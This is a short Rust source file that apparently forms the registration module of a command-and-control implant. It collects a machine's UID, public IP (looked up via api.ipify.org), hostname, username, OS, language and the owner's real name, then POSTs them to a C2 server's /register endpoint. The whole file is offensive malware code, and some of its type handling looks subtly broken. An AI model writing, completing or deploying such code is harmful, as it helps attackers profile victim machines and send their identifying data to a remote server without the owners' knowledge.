use std::collections::HashMap;

extern crate reqwest;
extern crate whoami;

pub fn register_client(host: &str, uid: &str) -> Result<(), Box<dyn std::error::Error>> {
    let uri = format!("{}/register", host);
    let mut obj = HashMap::<&'static str, &'static str>::new();

    obj.insert("uid", uid); // Insert machine UID to send to C2 server.

    let ip = get_ip();
    obj.insert("ip", ip.as_str()); // Insert machine IP to send to C2 server.

    let machine_details = machine_details();

    for (key, value) in &machine_details {
        obj.insert(key, value);
    }

    let client = reqwest::blocking::Client::new();
    let res = client.post(uri).json(&obj).send();

    if res.is_ok() {
        println!("{}", res.unwrap().text().unwrap());
    } else {
        if res.unwrap_err().is_connect() {
            println!("No connection to C2 server.");
        } else {
            println!("Unknown error.");
        }
    }

    println!("{:?}", obj);

    Ok(())
}

pub fn machine_details() -> HashMap<&'static str, String> {
    let mut details = HashMap::new();
    details.insert("hostname", whoami::hostname());
    details.insert("username", whoami::username());
    details.insert("os", whoami::distro());
    details.insert("lang", whoami::lang().next().unwrap());
    details.insert("fullname", whoami::realname());

    details
}

pub fn get_ip() -> String {
    let res = reqwest::blocking::get("https://api.ipify.org");

    if res.is_ok() {
        res.unwrap().text().unwrap()
    } else {
        String::from("IP not found.")
    }
}
